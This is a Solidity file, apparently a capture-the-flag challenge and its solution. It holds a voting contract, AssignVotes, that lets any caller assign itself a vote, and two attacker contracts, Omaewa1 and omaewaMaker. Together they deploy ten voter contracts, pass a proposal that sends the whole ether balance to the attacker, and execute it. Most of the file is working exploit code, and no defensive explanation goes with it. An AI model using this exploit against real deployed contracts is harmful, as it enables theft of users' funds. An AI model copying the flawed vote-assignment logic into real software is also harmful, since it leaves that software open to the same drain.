pragma solidity 0.8.15;

contract AssignVotes {
    uint256 public proposalCounter;
    mapping(address => int256) public amountAssigned;
    mapping(address => address) public assignedBy;
    mapping(address => bool) public alreadyVoted;

    uint256 public votes;

    struct Proposal {
        address target;
        bytes data;
        uint256 value;
        uint256 votes;
    }

    mapping(uint256 => Proposal) public proposals;

    constructor() payable {}

    function createProposal(
        address target,
        bytes calldata data,
        uint256 value
    ) external {
        proposals[proposalCounter] = Proposal({
            target: target,
            data: data,
            value: value,
            votes: 0
        });

        unchecked {
            ++proposalCounter;
        }
    }

    function removeAssignment(address _voter) public {
        require(!alreadyVoted[_voter], "already voted");
        require(assignedBy[_voter] != address(0), "not assigned");

        assignedBy[_voter] = address(0);
        amountAssigned[msg.sender] += 1;
    }

    function assign(address _voter) public {
        require(amountAssigned[msg.sender] >= -5, "you ran out of assignments");
        assignedBy[_voter] = msg.sender;
        amountAssigned[msg.sender] -= 1;
    }

    function vote(uint256 proposal) public {
        require(!alreadyVoted[msg.sender], "cannot vote twice");
        require(assignedBy[msg.sender] != address(0), "not assigned a vote");
        alreadyVoted[msg.sender] = true;

        proposals[proposal].votes++;
    }

    function execute(uint256 proposal) public {
        require(proposals[proposal].votes >= 10, "not enough votes");
        Proposal storage p = proposals[proposal];
        address target = p.target;
        uint256 value = p.value;
        bytes memory data = p.data;

        delete proposals[proposal];
        (bool success, ) = target.call{value: value}(data);
        require(success, "exec failed");
    }
}

contract Omaewa1 {
    constructor(AssignVotes _addy) {
        _addy.createProposal(msg.sender," ", address(_addy).balance);
        _addy.assign(address(this));
        _addy.vote(0);
       
        
    }
}


contract omaewaMaker{
   
    constructor(AssignVotes _addy){
      Omaewa1 o = new Omaewa1(_addy);
       Omaewa1 om = new Omaewa1(_addy);
      Omaewa1 omm = new Omaewa1(_addy);
      Omaewa1 ommm = new Omaewa1(_addy);
      Omaewa1 ommmm = new Omaewa1(_addy);
       Omaewa1 ommmmm = new Omaewa1(_addy);
          Omaewa1 ommmmmm = new Omaewa1(_addy);
          Omaewa1 ommmmmmm = new Omaewa1(_addy);
        Omaewa1 ommmmmmmm = new Omaewa1(_addy);
        Omaewa1 ommmmmmmmm = new Omaewa1(_addy);
        _addy.execute(0);
    }
}
